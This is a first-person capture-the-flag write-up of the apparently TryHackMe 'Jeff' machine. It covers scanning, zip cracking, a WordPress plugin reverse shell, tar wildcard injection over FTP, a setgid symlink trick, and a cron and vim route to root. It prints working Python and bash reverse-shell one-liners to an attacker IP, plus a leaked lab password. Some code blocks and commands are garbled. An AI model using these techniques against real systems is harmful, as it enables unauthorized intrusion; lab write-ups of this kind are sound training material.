# JEFF

First of all, I went on the IP address using browser and it appeared a white page. So I analyzed the html code and I found this comment.

<div><p align="center"><img  src="img/comment.png" /></div>

I added that address in my `/etc/hosts` on my kali machine and then I reloaded the page.

<div><p align="center"><img  src="img/jeff_home_page.png" /></div>

Meanwhile I had launched a scan to see the active services on the host and I found ports `80` and `22` open.

```
$ sudo nmap -Pn -sS --max-retries 1 --min-rate 20 -p- 10.10.147.129      
[sudo] password for ale:

I ran another scan only on those two ports to see the versions of the active services.
```

I didn't get any more information at the moment, so I ran one last scan with the `--script vuln` flag looking for known vulnerabilities.

```

From the scan results, the scanned apache version is vulnerable to CVE-2011-3192. Being a DOS-type vulnerability, it is not of interest to this penetration test, but it should still be documented.

Anyway, I also inspected the directories found by nmap, at first glance the `/admin` and `/backups/` directories don't seem very useful, while in the `/uploads/` directory there is a file upload form.

I uploaded some files via the upload form but I still don't know where they are saved. So after a couple of tries I changed my strategy, I ran some spider attacks on the various directories and I found a file called `backup.zip` in the `/backups/` directory.

I downloaded the file and tried to extract it, but I need a password to do so.

```
$ unzip backup.zip 
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
```

To find the password I decided to use john the ripper. First I converted the zip file into a format that john understands using the `zip2john` tool. 

```

Then with `john` and the rockyou wordlist I found the password and I extracted the files from the archive.

```

```

In the archive I found this file which contains another password, but at the moment I don't know where to use it. I need to do more research

```
$ cat wpadmin.bak 
wordpress password is: ***************** 
```

I didn't find any wordpress directories. Since I'm using a domain name, I tried to find if there was any subdomain that contained the wordpress site, after all jeff on his homepage wrote that he was working on a new version. So I used ffuf and found `wordpress.jeff.thm` and added it in the `/etc/hosts` file.

```
$ ffuf -w ~/tools/directory-list-2.3-medium.txt -u http://jeff.thm -H "Host: FUZZ.jeff.thm" -ac

    * FUZZ: wordpress
```

* `-H` "Host: FUZZ.jeff.thm": This option sets a custom header to the request. It uses the FUZZ keyword, which will be replaced by the values from the wordlist during the fuzzing process. The header being set in this case is Host, with the value FUZZ.jeff.thm. So, FUZZ will be replaced with each word from the wordlist during the fuzzing.
* `-ac`: This option stands for "Auto-Calibration." It tells ffuf to automatically calibrate the number of connections to optimize the fuzzing speed.

BINGO! I can continue from here.

<div><p align="center"><img  src="img/wordpress.png" /></div>

I went to the `wp-admin` page and logged in using the password found in the .bak file. Since I'm authenticated, I tried to load a reverse shell by inserting some php code in the index.php page, but it was not possible. There must be some restriction preventing me from editing the php.

<div><p align="center"><img  src="img/update_fail.png" /></div>

I looked for other ways to upload PHP code and found the installed plugins section. One of the installed plugins is "hello dolly", I think it's a default plugin, so I modified the code of the `hello.php` page and managed to load my reverse shell.

<div><p align="center"><img  src="img/update_ok.png" /></div>

Finally I activated the plugin in the "Installed plugin" page, on my terminal I listened with netcat, and I got the connection.

```

On the victim machine I ran linpeas, which highlighted the hardcoded database credentials in a `/var/www/html/wp-config.php`.

```
I also found credentials for an ftp server on `/var/www/html/ftp_backup.php`. It appears that this file has not yet been completed.

```php
<?php
/* 
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "******************";()

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 
```

Also, from this comment I understand that we are inside a container.

```php
$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host
```

Since the `ftp` command is not installed on the machine, I searched on internet for alternatives ways to connect to an ftp server, and I remembered that I can do this using the `curl` command. So I found that on the ftp server there is an empty folder called `files/`.

```
$ curl -v -s -P- 'ftp://backupmgr:******************@172.20.0.1/'

Later, with the help of linpeas, I found out that in the `/usr/lib/` folder there is `python3.7/` folder. This could make my life a lot easier.

```
$ cd /usr/lib/python3.7
$ python3.7 --version
Python 3.7.3
$ python3.7 -c 'import pty; pty.spawn("/bin/bash");'
www-data@Jeff:/usr/lib/python3.7$ ls -l
www-data@Jeff:/usr/lib/python3.7$ export PATH=/usr/lib/python3.7:$PATH
```
I could use python to interact with webserver. First of all, I checked if I have write permission on the server and the answare is YES. 

At this point I was stuck, so I searched for help on internet and I found this [hint](https://marcorei7.wordpress.com/2021/03/02/111-jeff/). It looks just like another person who, like me, got stuck and looked for help on the internet :').

*As per usual I wanted to upload a reverse shell to gain further access. But here I had no possibility to execute it directly. I spend a ton of time to find more out but I was stuck. The only hint I got here was, that there should be a hidden cronjob running at the other end. And it made so much sense and because I didnât know, what to upload or how to name it, I assumed that it was a wildcard cronjob picking every file up. For the wildcard injection I once again used this awesome post on [hackingarticles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) and created a Python script to do the work for me.*

Anyway, I didn't read further to avoid spoiling the whole solution and I assumed that there was a cronjob running on the other machine (though I would like to understand how I was supposed to understand this). I wrote a simple bash script to start a reverse shell and I downloaded it on victim machine via `curl` command and uploaded it to ftp server via using `python` and `ftlib`.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.15.73",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Reading this [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) on wildcar injection, I wrote this simple python script.

```python
from ftplib import FTP
import io
 
ftp = FTP('172.20.0.1')
ftp.login('backupmgr', '************************') 
ftp.set_pasv(False)
ftp.cwd('files')
 
shellfile = 'rev_shell.sh'
wildcard1 = '--checkpoint=1'
wildcard2 = '--checkpoint-action=exec=sh rev_shell.sh'
 
ftp.storlines('STOR ' + shellfile, open(shellfile, 'rb'))
ftp.storlines('STOR ' + wildcard1, open(wildcard1, 'rb'))
ftp.storlines('STOR ' + wildcard2, open(wildcard2, 'rb'))
 
ftp.dir()
ftp.quit()

```

From what I understand, reading jeff's comment in the file with the ftp credentials, it is possible to understand that he is creating a sort of backup system and therefore it si possible to must assume that there is a cronjob that creates and extracts archives repeatedly with the `tar` command (or zip, you have to do some tests). So it is possible to perform a wildacrd injection using files with "malicious" names to make the tar command execute my reverse shell.

I downloaded that script on target machine and I created other two malicious files.

```
www-data@Jeff:/tmp$ echo "" >> "--checkpoint=1"
www-data@Jeff:/tmp$ echo "" > "--checkpoint-action=exec=sh rev_shell.sh"
```

After that, I start a netcat listener on port 4545 on my local machine and I run the python script.

```
www-data@Jeff:/tmp$ python3.7 upload.py
python3.7 upload.py
-rwxr-xr-x    1 1001     1001            2 Jul 25 08:51 --checkpoint-action=exec=sh rev_shell.sh
-rwxr-xr-x    1 1001     1001            2 Jul 25 08:51 --checkpoint=1
-rwxr-xr-x    1 1001     1001           55 Jul 25 08:51 rev_shell.sh
```

Now that I have uploaded all the necessary files to the ftp server, if the hypotheses are correct, all that remains is to wait for the cronjob to be executed and consequently my `rev_shell.sh` file.

```
$ rlwrap nc -lnvp 4545       
listening on [any] 4545 ...
connect to [10.9.15.73] from (UNKNOWN) [10.10.112.1] 42210
/bin/sh: 0: can't access tty; job control turned off
$ whoami
backupmgr
```

During my researches I found a strange script owned by root in `/home/backupmgr/.tmp/` directory.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

It is clearly a python reverse shell, now I don't know if it could be usefull. Unfortunately I don't have write permissions on it.

For a deeper analysis I ran linpeas again, but this time with the backupmgr user which has higher permissions.
Based on its output, it seems that the FTP server's configuration file (/etc/vsftpd.conf) allows anonymous access.

There are two suspicious ports:
* A process is listening on TCP port 44215 on the loopback interface (127.0.0.1). It is actively waiting for incoming connections.
* There is a process listening on TCP port 8080 on the loopback interface (127.0.0.1). It is actively waiting for incoming connections.

On port 8080 there appears to be nothing, and the other appears to be closed.

On second thought, I've decided to focus on the jeff user (I learned about it thanks to linpeas, but it was also enough to check the home/ folder) and drop the root user for now. I searched all files owned by jeff and found something interesting.

```
backupmgr@tryharder:/home$ find / -user jeff -ls 2>/dev/null
find / -user jeff -ls 2>/dev/null
   795410      4 drwxrwxrwx   2 jeff     jeff         4096 May 24  2020 /opt/systools
   795411     20 -rwxr-sr-x   1 jeff     pwman       17160 May 24  2020 /opt/systools/systool
  1573629      4 drwx------   5 jeff     jeff         4096 May 18  2020 /home/jeff
  1056230      4 -rwxr-x---   1 jeff     pwman          43 May 11  2020 /var/backups/jeff.bak
```

The systool file appears to have the s bit set by user jeff. This means that I can execute that file with jeff's permissions.
There is also a file called message.txt which contains this message.

```
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```
It appears to be a message for jeff, probably written by the system administrator.
```
backupmgr@tryharder:/opt/systools$ ./systool
./systool

Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```
So that file was not just a warning but a message that is part of this program... Damn!

To better understand how this executable works I converted it to base64, copied the contents to a file on my local machine and decrypted it, getting the executable back. But there was nothing hidden, the executable reads the message.txt file when number 2 is input.

I remembered that another file owned by jeff was the file `jeff.bak`, on which I don't have read permissions.

```
backupmgr@tryharder:/var/backups$ file jeff.bak
jeff.bak: regular file, no read permission
```
After a while I realized that I could get the file to be read via the systool executable since it runs with jeff permissions. So I deleted the message.txt file and created a symlink with the same name to the .bak file.
```
backupmgr@tryharder:/opt/systools$ mv message.txt
backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ll
total 28
drwxrwxrwx 2 jeff      jeff       4096 Jul 26 13:55 ./
drwxr-xr-x 4 root      root       4096 May 24  2020 ../

-rwxr-sr-x 1 jeff      pwman     17160 May 24  2020 systool*
```
I re-launched the executable and chose option 2. The .bak file is nothing more than a text file containing a password.
```
backupmgr@tryharder:/opt/systools$ ./systool

Finally I was able to elevate my privileges and become jeff on the target system.
```
backupmgr@tryharder:/opt/systools$ su jeff
Password:

```
It uses a shell called rbash and I'm not able to use the cd command to move around, but I have no problem using the ll command. In fact, I could see the files in jeff's home and read the user.txt file.

```
jeff@tryharder:/opt/systools$ cd ..

I tried putting the first flag on tryhackme, but it's not the right flag. At first I was strange, then I read the message between the brackets well and I understood.
I took that string and hash it using cyberchef.

<div><p align="center"><img  src="img/hashing.png" /></div>

To get a normal shell that would allow me to carry on with my searches without problems, I just typed the command `bash`.

```
jeff@tryharder:/opt/systools$ bash
bash
```
I found that user jeff can run `crontab` command with root permissions via sudo.
```
jeff@tryharder:/tmp$ sudo -l
[sudo] password for jeff:

Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```
The only problem was that I didn't have a stable shell and therefore the text editor didn't allow me to write the cronjob file. But since I know jeff's password I was able to ssh into it and have a stable shell.

```
$ ssh jeff@jeff.thm

I thought I was done with the CTF, but as soon as I ssh'd in, and thus after getting a stable shell, I had a lot more restrictions.
```
jeff@tryharder:~$ sudo -l
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
jeff@tryharder:~$ bash
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

For some strange reason, through the pty shell obtained with python I could safely execute the bash command. So I went back to the previous shell and did some internet searching and found a way to change the default shell.

```
jeff@tryharder:/home/backupmgr$ chsh
Password: 123-My-N4M3-1z-J3ff-123

Changing the login shell for jeff
Enter the new value, or press ENTER for the default
        Login Shell [/bin/rbash]: /bin/bash
```

In the end I also had to change the PATH environment variable.

Jeff wanted to piss off until the end...
```
jeff@tryharder:~$ sudo -l
Command 'sudo' is available in '/usr/bin/sudo'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
sudo: command not found
jeff@tryharder:~$ export PATH=/usr/bin:$PATH
jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```
I added the final line to the `/etc/crontab` file.
```
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

* * * * * bash -i >& /dev/tcp/10.9.15.73/4242 0>&1
```

Finally I managed to create a new cronjob with root permissions and now I just have to wait to receive the connection.

Obviously the cronjob didn't work...

After some hysterical laughter I remembered that the editor that starts when you run the `crontab` command is `vim`, and from vim it is possible to spawn a shell.

<div><p align="center"><img  src="img/shell_vim.png" /></div>

From here I got a fully functional root shell and read the last flag.
